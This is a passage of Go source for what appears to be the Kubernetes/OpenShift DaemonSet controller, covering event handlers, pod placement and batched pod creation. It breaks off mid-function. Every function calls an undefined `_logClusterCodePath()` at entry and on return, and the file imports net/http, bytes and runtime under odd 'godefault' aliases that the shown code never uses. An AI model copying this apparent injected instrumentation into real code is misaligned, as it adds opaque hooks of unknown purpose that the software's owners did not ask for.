package daemon

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "reflect"
 "sort"
 "sync"
 "time"
 "k8s.io/klog"
 apps "k8s.io/api/apps/v1"
 "k8s.io/api/core/v1"
 apiequality "k8s.io/apimachinery/pkg/api/equality"
 "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/labels"
 "k8s.io/apimachinery/pkg/types"
 utilerrors "k8s.io/apimachinery/pkg/util/errors"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apimachinery/pkg/util/sets"
 "k8s.io/apimachinery/pkg/util/wait"
 utilfeature "k8s.io/apiserver/pkg/util/feature"
 appsinformers "k8s.io/client-go/informers/apps/v1"
 coreinformers "k8s.io/client-go/informers/core/v1"
 clientset "k8s.io/client-go/kubernetes"
 "k8s.io/client-go/kubernetes/scheme"
 unversionedapps "k8s.io/client-go/kubernetes/typed/apps/v1"
 v1core "k8s.io/client-go/kubernetes/typed/core/v1"
 appslisters "k8s.io/client-go/listers/apps/v1"
 corelisters "k8s.io/client-go/listers/core/v1"
 "k8s.io/client-go/tools/cache"
 "k8s.io/client-go/tools/record"
 "k8s.io/client-go/util/flowcontrol"
 "k8s.io/client-go/util/integer"
 "k8s.io/client-go/util/workqueue"
 podutil "k8s.io/kubernetes/pkg/api/v1/pod"
 "k8s.io/kubernetes/pkg/controller"
 "k8s.io/kubernetes/pkg/controller/daemon/util"
 "k8s.io/kubernetes/pkg/features"
 kubelettypes "k8s.io/kubernetes/pkg/kubelet/types"
 "k8s.io/kubernetes/pkg/scheduler/algorithm"
 "k8s.io/kubernetes/pkg/scheduler/algorithm/predicates"
 schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
 "k8s.io/kubernetes/pkg/util/metrics"
)

const (
 BurstReplicas       = 250
 StatusUpdateRetries = 1
 BackoffGCInterval   = 1 * time.Minute
)
const (
 SelectingAllReason    = "SelectingAll"
 FailedPlacementReason = "FailedPlacement"
 FailedDaemonPodReason = "FailedDaemonPod"
)

var controllerKind = apps.SchemeGroupVersion.WithKind("DaemonSet")

type DaemonSetsController struct {
 kubeClient                         clientset.Interface
 eventRecorder                      record.EventRecorder
 podControl                         controller.PodControlInterface
 crControl                          controller.ControllerRevisionControlInterface
 burstReplicas                      int
 syncHandler                        func(dsKey string) error
 enqueueDaemonSet                   func(ds *apps.DaemonSet)
 enqueueDaemonSetRateLimited        func(ds *apps.DaemonSet)
 expectations                       controller.ControllerExpectationsInterface
 dsLister                           appslisters.DaemonSetLister
 dsStoreSynced                      cache.InformerSynced
 historyLister                      appslisters.ControllerRevisionLister
 historyStoreSynced                 cache.InformerSynced
 podLister                          corelisters.PodLister
 podNodeIndex                       cache.Indexer
 podStoreSynced                     cache.InformerSynced
 nodeLister                         corelisters.NodeLister
 nodeStoreSynced                    cache.InformerSynced
 namespaceLister                    corelisters.NamespaceLister
 namespaceStoreSynced               cache.InformerSynced
 openshiftDefaultNodeSelectorString string
 openshiftDefaultNodeSelector       labels.Selector
 kubeDefaultNodeSelectorString      string
 kubeDefaultNodeSelector            labels.Selector
 queue                              workqueue.RateLimitingInterface
 suspendedDaemonPodsMutex           sync.Mutex
 suspendedDaemonPods                map[string]sets.String
 failedPodsBackoff                  *flowcontrol.Backoff
}

func NewDaemonSetsController(daemonSetInformer appsinformers.DaemonSetInformer, historyInformer appsinformers.ControllerRevisionInformer, podInformer coreinformers.PodInformer, nodeInformer coreinformers.NodeInformer, kubeClient clientset.Interface, failedPodsBackoff *flowcontrol.Backoff) (*DaemonSetsController, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 eventBroadcaster := record.NewBroadcaster()
 eventBroadcaster.StartLogging(klog.Infof)
 eventBroadcaster.StartRecordingToSink(&v1core.EventSinkImpl{Interface: kubeClient.CoreV1().Events("")})
 if kubeClient != nil && kubeClient.CoreV1().RESTClient().GetRateLimiter() != nil {
  if err := metrics.RegisterMetricAndTrackRateLimiterUsage("daemon_controller", kubeClient.CoreV1().RESTClient().GetRateLimiter()); err != nil {
   return nil, err
  }
 }
 dsc := &DaemonSetsController{kubeClient: kubeClient, eventRecorder: eventBroadcaster.NewRecorder(scheme.Scheme, v1.EventSource{Component: "daemonset-controller"}), podControl: controller.RealPodControl{KubeClient: kubeClient, Recorder: eventBroadcaster.NewRecorder(scheme.Scheme, v1.EventSource{Component: "daemonset-controller"})}, crControl: controller.RealControllerRevisionControl{KubeClient: kubeClient}, burstReplicas: BurstReplicas, expectations: controller.NewControllerExpectations(), queue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), "daemonset"), suspendedDaemonPods: map[string]sets.String{}}
 daemonSetInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: func(obj interface{}) {
  ds := obj.(*apps.DaemonSet)
  klog.V(4).Infof("Adding daemon set %s", ds.Name)
  dsc.enqueueDaemonSet(ds)
 }, UpdateFunc: func(old, cur interface{}) {
  oldDS := old.(*apps.DaemonSet)
  curDS := cur.(*apps.DaemonSet)
  klog.V(4).Infof("Updating daemon set %s", oldDS.Name)
  dsc.enqueueDaemonSet(curDS)
 }, DeleteFunc: dsc.deleteDaemonset})
 dsc.dsLister = daemonSetInformer.Lister()
 dsc.dsStoreSynced = daemonSetInformer.Informer().HasSynced
 historyInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: dsc.addHistory, UpdateFunc: dsc.updateHistory, DeleteFunc: dsc.deleteHistory})
 dsc.historyLister = historyInformer.Lister()
 dsc.historyStoreSynced = historyInformer.Informer().HasSynced
 podInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: dsc.addPod, UpdateFunc: dsc.updatePod, DeleteFunc: dsc.deletePod})
 dsc.podLister = podInformer.Lister()
 podInformer.Informer().GetIndexer().AddIndexers(cache.Indexers{"nodeName": indexByPodNodeName})
 dsc.podNodeIndex = podInformer.Informer().GetIndexer()
 dsc.podStoreSynced = podInformer.Informer().HasSynced
 nodeInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: dsc.addNode, UpdateFunc: dsc.updateNode})
 dsc.nodeStoreSynced = nodeInformer.Informer().HasSynced
 dsc.nodeLister = nodeInformer.Lister()
 dsc.syncHandler = dsc.syncDaemonSet
 dsc.enqueueDaemonSet = dsc.enqueue
 dsc.enqueueDaemonSetRateLimited = dsc.enqueueRateLimited
 dsc.failedPodsBackoff = failedPodsBackoff
 return dsc, nil
}
func indexByPodNodeName(obj interface{}) ([]string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pod, ok := obj.(*v1.Pod)
 if !ok {
  return []string{}, nil
 }
 if len(pod.Spec.NodeName) == 0 || pod.Status.Phase == v1.PodSucceeded || pod.Status.Phase == v1.PodFailed {
  return []string{}, nil
 }
 return []string{pod.Spec.NodeName}, nil
}
func (dsc *DaemonSetsController) deleteDaemonset(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 ds, ok := obj.(*apps.DaemonSet)
 if !ok {
  tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("Couldn't get object from tombstone %#v", obj))
   return
  }
  ds, ok = tombstone.Obj.(*apps.DaemonSet)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("Tombstone contained object that is not a DaemonSet %#v", obj))
   return
  }
 }
 klog.V(4).Infof("Deleting daemon set %s", ds.Name)
 dsc.enqueueDaemonSet(ds)
}
func (dsc *DaemonSetsController) Run(workers int, stopCh <-chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defer utilruntime.HandleCrash()
 defer dsc.queue.ShutDown()
 klog.Infof("Starting daemon sets controller")
 defer klog.Infof("Shutting down daemon sets controller")
 if !controller.WaitForCacheSync("daemon sets", stopCh, dsc.podStoreSynced, dsc.nodeStoreSynced, dsc.historyStoreSynced, dsc.dsStoreSynced) {
  return
 }
 if dsc.namespaceStoreSynced != nil {
  if !controller.WaitForCacheSync("daemon sets", stopCh, dsc.namespaceStoreSynced) {
   return
  }
 }
 for i := 0; i < workers; i++ {
  go wait.Until(dsc.runWorker, time.Second, stopCh)
 }
 go wait.Until(dsc.failedPodsBackoff.GC, BackoffGCInterval, stopCh)
 <-stopCh
}
func (dsc *DaemonSetsController) runWorker() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for dsc.processNextWorkItem() {
 }
}
func (dsc *DaemonSetsController) processNextWorkItem() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 dsKey, quit := dsc.queue.Get()
 if quit {
  return false
 }
 defer dsc.queue.Done(dsKey)
 err := dsc.syncHandler(dsKey.(string))
 if err == nil {
  dsc.queue.Forget(dsKey)
  return true
 }
 utilruntime.HandleError(fmt.Errorf("%v failed with : %v", dsKey, err))
 dsc.queue.AddRateLimited(dsKey)
 return true
}
func (dsc *DaemonSetsController) enqueue(ds *apps.DaemonSet) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 key, err := controller.KeyFunc(ds)
 if err != nil {
  utilruntime.HandleError(fmt.Errorf("Couldn't get key for object %#v: %v", ds, err))
  return
 }
 dsc.queue.Add(key)
}
func (dsc *DaemonSetsController) enqueueRateLimited(ds *apps.DaemonSet) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 key, err := controller.KeyFunc(ds)
 if err != nil {
  utilruntime.HandleError(fmt.Errorf("Couldn't get key for object %#v: %v", ds, err))
  return
 }
 dsc.queue.AddRateLimited(key)
}
func (dsc *DaemonSetsController) enqueueDaemonSetAfter(obj interface{}, after time.Duration) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 key, err := controller.KeyFunc(obj)
 if err != nil {
  utilruntime.HandleError(fmt.Errorf("Couldn't get key for object %+v: %v", obj, err))
  return
 }
 dsc.queue.AddAfter(key, after)
}
func (dsc *DaemonSetsController) getDaemonSetsForPod(pod *v1.Pod) []*apps.DaemonSet {
 _logClusterCodePath()
 defer _logClusterCodePath()
 sets, err := dsc.dsLister.GetPodDaemonSets(pod)
 if err != nil {
  return nil
 }
 if len(sets) > 1 {
  utilruntime.HandleError(fmt.Errorf("user error! more than one daemon is selecting pods with labels: %+v", pod.Labels))
 }
 return sets
}
func (dsc *DaemonSetsController) getDaemonSetsForHistory(history *apps.ControllerRevision) []*apps.DaemonSet {
 _logClusterCodePath()
 defer _logClusterCodePath()
 daemonSets, err := dsc.dsLister.GetHistoryDaemonSets(history)
 if err != nil || len(daemonSets) == 0 {
  return nil
 }
 if len(daemonSets) > 1 {
  klog.V(4).Infof("User error! more than one DaemonSets is selecting ControllerRevision %s/%s with labels: %#v", history.Namespace, history.Name, history.Labels)
 }
 return daemonSets
}
func (dsc *DaemonSetsController) addHistory(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 history := obj.(*apps.ControllerRevision)
 if history.DeletionTimestamp != nil {
  dsc.deleteHistory(history)
  return
 }
 if controllerRef := metav1.GetControllerOf(history); controllerRef != nil {
  ds := dsc.resolveControllerRef(history.Namespace, controllerRef)
  if ds == nil {
   return
  }
  klog.V(4).Infof("ControllerRevision %s added.", history.Name)
  return
 }
 daemonSets := dsc.getDaemonSetsForHistory(history)
 if len(daemonSets) == 0 {
  return
 }
 klog.V(4).Infof("Orphan ControllerRevision %s added.", history.Name)
 for _, ds := range daemonSets {
  dsc.enqueueDaemonSet(ds)
 }
}
func (dsc *DaemonSetsController) updateHistory(old, cur interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 curHistory := cur.(*apps.ControllerRevision)
 oldHistory := old.(*apps.ControllerRevision)
 if curHistory.ResourceVersion == oldHistory.ResourceVersion {
  return
 }
 curControllerRef := metav1.GetControllerOf(curHistory)
 oldControllerRef := metav1.GetControllerOf(oldHistory)
 controllerRefChanged := !reflect.DeepEqual(curControllerRef, oldControllerRef)
 if controllerRefChanged && oldControllerRef != nil {
  if ds := dsc.resolveControllerRef(oldHistory.Namespace, oldControllerRef); ds != nil {
   dsc.enqueueDaemonSet(ds)
  }
 }
 if curControllerRef != nil {
  ds := dsc.resolveControllerRef(curHistory.Namespace, curControllerRef)
  if ds == nil {
   return
  }
  klog.V(4).Infof("ControllerRevision %s updated.", curHistory.Name)
  dsc.enqueueDaemonSet(ds)
  return
 }
 labelChanged := !reflect.DeepEqual(curHistory.Labels, oldHistory.Labels)
 if labelChanged || controllerRefChanged {
  daemonSets := dsc.getDaemonSetsForHistory(curHistory)
  if len(daemonSets) == 0 {
   return
  }
  klog.V(4).Infof("Orphan ControllerRevision %s updated.", curHistory.Name)
  for _, ds := range daemonSets {
   dsc.enqueueDaemonSet(ds)
  }
 }
}
func (dsc *DaemonSetsController) deleteHistory(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 history, ok := obj.(*apps.ControllerRevision)
 if !ok {
  tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("Couldn't get object from tombstone %#v", obj))
   return
  }
  history, ok = tombstone.Obj.(*apps.ControllerRevision)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("Tombstone contained object that is not a ControllerRevision %#v", obj))
   return
  }
 }
 controllerRef := metav1.GetControllerOf(history)
 if controllerRef == nil {
  return
 }
 ds := dsc.resolveControllerRef(history.Namespace, controllerRef)
 if ds == nil {
  return
 }
 klog.V(4).Infof("ControllerRevision %s deleted.", history.Name)
 dsc.enqueueDaemonSet(ds)
}
func (dsc *DaemonSetsController) addPod(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pod := obj.(*v1.Pod)
 if pod.DeletionTimestamp != nil {
  dsc.deletePod(pod)
  return
 }
 if controllerRef := metav1.GetControllerOf(pod); controllerRef != nil {
  ds := dsc.resolveControllerRef(pod.Namespace, controllerRef)
  if ds == nil {
   return
  }
  dsKey, err := controller.KeyFunc(ds)
  if err != nil {
   return
  }
  klog.V(4).Infof("Pod %s added.", pod.Name)
  dsc.expectations.CreationObserved(dsKey)
  dsc.enqueueDaemonSet(ds)
  return
 }
 dss := dsc.getDaemonSetsForPod(pod)
 if len(dss) == 0 {
  return
 }
 klog.V(4).Infof("Orphan Pod %s added.", pod.Name)
 for _, ds := range dss {
  dsc.enqueueDaemonSet(ds)
 }
}
func (dsc *DaemonSetsController) updatePod(old, cur interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 curPod := cur.(*v1.Pod)
 oldPod := old.(*v1.Pod)
 if curPod.ResourceVersion == oldPod.ResourceVersion {
  return
 }
 curControllerRef := metav1.GetControllerOf(curPod)
 oldControllerRef := metav1.GetControllerOf(oldPod)
 controllerRefChanged := !reflect.DeepEqual(curControllerRef, oldControllerRef)
 if controllerRefChanged && oldControllerRef != nil {
  if ds := dsc.resolveControllerRef(oldPod.Namespace, oldControllerRef); ds != nil {
   dsc.enqueueDaemonSet(ds)
  }
 }
 if curControllerRef != nil {
  ds := dsc.resolveControllerRef(curPod.Namespace, curControllerRef)
  if ds == nil {
   return
  }
  klog.V(4).Infof("Pod %s updated.", curPod.Name)
  dsc.enqueueDaemonSet(ds)
  changedToReady := !podutil.IsPodReady(oldPod) && podutil.IsPodReady(curPod)
  if changedToReady && ds.Spec.MinReadySeconds > 0 {
   dsc.enqueueDaemonSetAfter(ds, (time.Duration(ds.Spec.MinReadySeconds)*time.Second)+time.Second)
  }
  return
 }
 dss := dsc.getDaemonSetsForPod(curPod)
 if len(dss) == 0 {
  return
 }
 klog.V(4).Infof("Orphan Pod %s updated.", curPod.Name)
 labelChanged := !reflect.DeepEqual(curPod.Labels, oldPod.Labels)
 if labelChanged || controllerRefChanged {
  for _, ds := range dss {
   dsc.enqueueDaemonSet(ds)
  }
 }
}
func (dsc *DaemonSetsController) listSuspendedDaemonPods(node string) (dss []string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 dsc.suspendedDaemonPodsMutex.Lock()
 defer dsc.suspendedDaemonPodsMutex.Unlock()
 if _, found := dsc.suspendedDaemonPods[node]; !found {
  return nil
 }
 for k := range dsc.suspendedDaemonPods[node] {
  dss = append(dss, k)
 }
 return
}
func (dsc *DaemonSetsController) requeueSuspendedDaemonPods(node string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 dss := dsc.listSuspendedDaemonPods(node)
 for _, dsKey := range dss {
  if ns, name, err := cache.SplitMetaNamespaceKey(dsKey); err != nil {
   klog.Errorf("Failed to get DaemonSet's namespace and name from %s: %v", dsKey, err)
   continue
  } else if ds, err := dsc.dsLister.DaemonSets(ns).Get(name); err != nil {
   klog.Errorf("Failed to get DaemonSet %s/%s: %v", ns, name, err)
   continue
  } else {
   dsc.enqueueDaemonSetRateLimited(ds)
  }
 }
}
func (dsc *DaemonSetsController) addSuspendedDaemonPods(node, ds string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 dsc.suspendedDaemonPodsMutex.Lock()
 defer dsc.suspendedDaemonPodsMutex.Unlock()
 if _, found := dsc.suspendedDaemonPods[node]; !found {
  dsc.suspendedDaemonPods[node] = sets.NewString()
 }
 dsc.suspendedDaemonPods[node].Insert(ds)
}
func (dsc *DaemonSetsController) removeSuspendedDaemonPods(node, ds string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 dsc.suspendedDaemonPodsMutex.Lock()
 defer dsc.suspendedDaemonPodsMutex.Unlock()
 if _, found := dsc.suspendedDaemonPods[node]; !found {
  return
 }
 dsc.suspendedDaemonPods[node].Delete(ds)
 if len(dsc.suspendedDaemonPods[node]) == 0 {
  delete(dsc.suspendedDaemonPods, node)
 }
}
func (dsc *DaemonSetsController) deletePod(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pod, ok := obj.(*v1.Pod)
 if !ok {
  tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("couldn't get object from tombstone %#v", obj))
   return
  }
  pod, ok = tombstone.Obj.(*v1.Pod)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("tombstone contained object that is not a pod %#v", obj))
   return
  }
 }
 controllerRef := metav1.GetControllerOf(pod)
 if controllerRef == nil {
  if len(pod.Spec.NodeName) != 0 {
   dsc.requeueSuspendedDaemonPods(pod.Spec.NodeName)
  }
  return
 }
 ds := dsc.resolveControllerRef(pod.Namespace, controllerRef)
 if ds == nil {
  if len(pod.Spec.NodeName) != 0 {
   dsc.requeueSuspendedDaemonPods(pod.Spec.NodeName)
  }
  return
 }
 dsKey, err := controller.KeyFunc(ds)
 if err != nil {
  return
 }
 klog.V(4).Infof("Pod %s deleted.", pod.Name)
 dsc.expectations.DeletionObserved(dsKey)
 dsc.enqueueDaemonSet(ds)
}
func (dsc *DaemonSetsController) addNode(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 dsList, err := dsc.dsLister.List(labels.Everything())
 if err != nil {
  klog.V(4).Infof("Error enqueueing daemon sets: %v", err)
  return
 }
 node := obj.(*v1.Node)
 for _, ds := range dsList {
  _, shouldSchedule, _, err := dsc.nodeShouldRunDaemonPod(node, ds)
  if err != nil {
   continue
  }
  if shouldSchedule {
   dsc.enqueueDaemonSet(ds)
  }
 }
}
func nodeInSameCondition(old []v1.NodeCondition, cur []v1.NodeCondition) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(old) == 0 && len(cur) == 0 {
  return true
 }
 c1map := map[v1.NodeConditionType]v1.ConditionStatus{}
 for _, c := range old {
  if c.Status == v1.ConditionTrue {
   c1map[c.Type] = c.Status
  }
 }
 for _, c := range cur {
  if c.Status != v1.ConditionTrue {
   continue
  }
  if _, found := c1map[c.Type]; !found {
   return false
  }
  delete(c1map, c.Type)
 }
 return len(c1map) == 0
}
func shouldIgnoreNodeUpdate(oldNode, curNode v1.Node) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !nodeInSameCondition(oldNode.Status.Conditions, curNode.Status.Conditions) {
  return false
 }
 oldNode.ResourceVersion = curNode.ResourceVersion
 oldNode.Status.Conditions = curNode.Status.Conditions
 return apiequality.Semantic.DeepEqual(oldNode, curNode)
}
func (dsc *DaemonSetsController) updateNode(old, cur interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 oldNode := old.(*v1.Node)
 curNode := cur.(*v1.Node)
 if shouldIgnoreNodeUpdate(*oldNode, *curNode) {
  return
 }
 dsList, err := dsc.dsLister.List(labels.Everything())
 if err != nil {
  klog.V(4).Infof("Error listing daemon sets: %v", err)
  return
 }
 for _, ds := range dsList {
  _, oldShouldSchedule, oldShouldContinueRunning, err := dsc.nodeShouldRunDaemonPod(oldNode, ds)
  if err != nil {
   continue
  }
  _, currentShouldSchedule, currentShouldContinueRunning, err := dsc.nodeShouldRunDaemonPod(curNode, ds)
  if err != nil {
   continue
  }
  if (oldShouldSchedule != currentShouldSchedule) || (oldShouldContinueRunning != currentShouldContinueRunning) {
   dsc.enqueueDaemonSet(ds)
  }
 }
}
func (dsc *DaemonSetsController) getDaemonPods(ds *apps.DaemonSet) ([]*v1.Pod, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 selector, err := metav1.LabelSelectorAsSelector(ds.Spec.Selector)
 if err != nil {
  return nil, err
 }
 pods, err := dsc.podLister.Pods(ds.Namespace).List(labels.Everything())
 if err != nil {
  return nil, err
 }
 dsNotDeleted := controller.RecheckDeletionTimestamp(func() (metav1.Object, error) {
  fresh, err := dsc.kubeClient.AppsV1().DaemonSets(ds.Namespace).Get(ds.Name, metav1.GetOptions{})
  if err != nil {
   return nil, err
  }
  if fresh.UID != ds.UID {
   return nil, fmt.Errorf("original DaemonSet %v/%v is gone: got uid %v, wanted %v", ds.Namespace, ds.Name, fresh.UID, ds.UID)
  }
  return fresh, nil
 })
 cm := controller.NewPodControllerRefManager(dsc.podControl, ds, selector, controllerKind, dsNotDeleted)
 return cm.ClaimPods(pods)
}
func (dsc *DaemonSetsController) getNodesToDaemonPods(ds *apps.DaemonSet) (map[string][]*v1.Pod, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 claimedPods, err := dsc.getDaemonPods(ds)
 if err != nil {
  return nil, err
 }
 nodeToDaemonPods := make(map[string][]*v1.Pod)
 for _, pod := range claimedPods {
  nodeName, err := util.GetTargetNodeName(pod)
  if err != nil {
   klog.Warningf("Failed to get target node name of Pod %v/%v in DaemonSet %v/%v", pod.Namespace, pod.Name, ds.Namespace, ds.Name)
   continue
  }
  nodeToDaemonPods[nodeName] = append(nodeToDaemonPods[nodeName], pod)
 }
 return nodeToDaemonPods, nil
}
func (dsc *DaemonSetsController) resolveControllerRef(namespace string, controllerRef *metav1.OwnerReference) *apps.DaemonSet {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if controllerRef.Kind != controllerKind.Kind {
  return nil
 }
 ds, err := dsc.dsLister.DaemonSets(namespace).Get(controllerRef.Name)
 if err != nil {
  return nil
 }
 if ds.UID != controllerRef.UID {
  return nil
 }
 return ds
}
func (dsc *DaemonSetsController) podsShouldBeOnNode(node *v1.Node, nodeToDaemonPods map[string][]*v1.Pod, ds *apps.DaemonSet) (nodesNeedingDaemonPods, podsToDelete []string, failedPodsObserved int, err error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 wantToRun, shouldSchedule, shouldContinueRunning, err := dsc.nodeShouldRunDaemonPod(node, ds)
 if err != nil {
  return
 }
 daemonPods, exists := nodeToDaemonPods[node.Name]
 dsKey, _ := cache.MetaNamespaceKeyFunc(ds)
 dsc.removeSuspendedDaemonPods(node.Name, dsKey)
 switch {
 case wantToRun && !shouldSchedule:
  dsc.addSuspendedDaemonPods(node.Name, dsKey)
 case shouldSchedule && !exists:
  nodesNeedingDaemonPods = append(nodesNeedingDaemonPods, node.Name)
 case shouldContinueRunning:
  var daemonPodsRunning []*v1.Pod
  for _, pod := range daemonPods {
   if pod.DeletionTimestamp != nil {
    continue
   }
   if pod.Status.Phase == v1.PodFailed {
    failedPodsObserved++
    backoffKey := failedPodsBackoffKey(ds, node.Name)
    now := dsc.failedPodsBackoff.Clock.Now()
    inBackoff := dsc.failedPodsBackoff.IsInBackOffSinceUpdate(backoffKey, now)
    if inBackoff {
     delay := dsc.failedPodsBackoff.Get(backoffKey)
     klog.V(4).Infof("Deleting failed pod %s/%s on node %s has been limited by backoff - %v remaining", pod.Namespace, pod.Name, node.Name, delay)
     dsc.enqueueDaemonSetAfter(ds, delay)
     continue
    }
    dsc.failedPodsBackoff.Next(backoffKey, now)
    msg := fmt.Sprintf("Found failed daemon pod %s/%s on node %s, will try to kill it", pod.Namespace, pod.Name, node.Name)
    klog.V(2).Infof(msg)
    dsc.eventRecorder.Eventf(ds, v1.EventTypeWarning, FailedDaemonPodReason, msg)
    podsToDelete = append(podsToDelete, pod.Name)
   } else {
    daemonPodsRunning = append(daemonPodsRunning, pod)
   }
  }
  if len(daemonPodsRunning) > 1 {
   sort.Sort(podByCreationTimestampAndPhase(daemonPodsRunning))
   for i := 1; i < len(daemonPodsRunning); i++ {
    podsToDelete = append(podsToDelete, daemonPodsRunning[i].Name)
   }
  }
 case !shouldContinueRunning && exists:
  for _, pod := range daemonPods {
   podsToDelete = append(podsToDelete, pod.Name)
  }
 }
 return nodesNeedingDaemonPods, podsToDelete, failedPodsObserved, nil
}
func (dsc *DaemonSetsController) manage(ds *apps.DaemonSet, hash string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 nodeToDaemonPods, err := dsc.getNodesToDaemonPods(ds)
 if err != nil {
  return fmt.Errorf("couldn't get node to daemon pod mapping for daemon set %q: %v", ds.Name, err)
 }
 nodeList, err := dsc.nodeLister.List(labels.Everything())
 if err != nil {
  return fmt.Errorf("couldn't get list of nodes when syncing daemon set %#v: %v", ds, err)
 }
 var nodesNeedingDaemonPods, podsToDelete []string
 var failedPodsObserved int
 for _, node := range nodeList {
  nodesNeedingDaemonPodsOnNode, podsToDeleteOnNode, failedPodsObservedOnNode, err := dsc.podsShouldBeOnNode(node, nodeToDaemonPods, ds)
  if err != nil {
   continue
  }
  nodesNeedingDaemonPods = append(nodesNeedingDaemonPods, nodesNeedingDaemonPodsOnNode...)
  podsToDelete = append(podsToDelete, podsToDeleteOnNode...)
  failedPodsObserved += failedPodsObservedOnNode
 }
 if utilfeature.DefaultFeatureGate.Enabled(features.ScheduleDaemonSetPods) {
  podsToDelete = append(podsToDelete, getPodsWithoutNode(nodeList, nodeToDaemonPods)...)
 }
 if err = dsc.syncNodes(ds, podsToDelete, nodesNeedingDaemonPods, hash); err != nil {
  return err
 }
 if failedPodsObserved > 0 {
  return fmt.Errorf("deleted %d failed pods of DaemonSet %s/%s", failedPodsObserved, ds.Namespace, ds.Name)
 }
 return nil
}
func (dsc *DaemonSetsController) syncNodes(ds *apps.DaemonSet, podsToDelete, nodesNeedingDaemonPods []string, hash string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 dsKey, err := controller.KeyFunc(ds)
 if err != nil {
  return fmt.Errorf("couldn't get key for object %#v: %v", ds, err)
 }
 createDiff := len(nodesNeedingDaemonPods)
 deleteDiff := len(podsToDelete)
 if createDiff > dsc.burstReplicas {
  createDiff = dsc.burstReplicas
 }
 if deleteDiff > dsc.burstReplicas {
  deleteDiff = dsc.burstReplicas
 }
 dsc.expectations.SetExpectations(dsKey, createDiff, deleteDiff)
 errCh := make(chan error, createDiff+deleteDiff)
 klog.V(4).Infof("Nodes needing daemon pods for daemon set %s: %+v, creating %d", ds.Name, nodesNeedingDaemonPods, createDiff)
 createWait := sync.WaitGroup{}
 generation, err := util.GetTemplateGeneration(ds)
 if err != nil {
  generation = nil
 }
 template := util.CreatePodTemplate(ds.Namespace, ds.Spec.Template, generation, hash)
 batchSize := integer.IntMin(createDiff, controller.SlowStartInitialBatchSize)
 for pos := 0; createDiff > pos; batchSize, pos = integer.IntMin(2*batchSize, createDiff-(pos+batchSize)), pos+batchSize {
  errorCount := len(errCh)
  createWait.Add(batchSize)
  for i := pos; i < pos+batchSize; i++ {
   go func(ix int) {
    defer createWait.Done()
    var err error
    podTemplate := &template
    if utilfeature.DefaultFeatureGate.Enabled(features.ScheduleDaemonSetPods) {
     podTemplate = template.DeepCopy()
     podTemplate.Spec.Affinity = util.ReplaceDaemonSetPodNodeNameNodeAffinity(podTemplate.Spec.Affinity, nodesNeedingDaemonPods[ix])
     err = dsc.podControl.CreatePodsWithControllerRef(ds.Namespace, podTemplate, ds, metav1.NewControllerRef(ds, controllerKind))
    } else {
     err = dsc.podControl.CreatePodsOnNode(nodesNeedingDaemonPods[ix], ds.Namespace, podTemplate, ds, metav1.NewControllerRef(ds, controllerKind))
    }
    if err != nil && errors.IsTimeout(err) {
     return
    }
    if err != nil {
     klog.V(2).Infof("Failed creation, decrementing expectations for set %q/%q", ds.Namespace, ds.Name)
     dsc.expectations.CreationObserved(dsKey)
     errCh <- err
     utilruntime.HandleError(err)
    }
   }(i)
  }
  createWait.Wait()
  skippedPods := createDiff - batchSize
  if errorCount < len(errCh) && skippedPods > 0 {
   klog.V(2).Infof("Slow-start failure. Skipping creation of %d pods, decrementing expectations for set %q/%q", skippedPods, ds.Namespace, ds.Name)
   for i := 0; i < skippedPods; i++ {
    dsc.expectations.CreationObserved(dsKey)
   }
   break
  }
 }
 klog.V(4).Infof("Pods to delete for daemon set %s: %+v, deleting %d", ds.Name, podsToDelete, deleteDiff)
 deleteWait := sync.WaitGroup{}
 deleteWait.Add(deleteDiff)
 for i := 0; i < deleteDiff; i++ {
  go func(ix int) {
   defer deleteWait.Done()
   if err := dsc.podControl.DeletePod(ds.Namespace, podsToDelete[ix], ds); err != nil {
